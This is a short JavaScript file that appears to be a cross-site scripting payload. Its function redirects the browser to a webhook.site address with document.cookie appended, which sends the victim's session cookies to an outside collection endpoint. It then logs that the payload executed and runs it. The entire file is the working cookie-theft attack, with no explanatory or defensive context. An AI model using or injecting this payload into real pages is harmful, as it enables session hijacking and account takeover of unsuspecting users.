function xssPayload() {
  document.location="https://webhook.site/d24d0023-ec35-46a2-a38f-b54931323d05" + document.cookie;
}

console.log('XSS payload executed');
xssPayload();
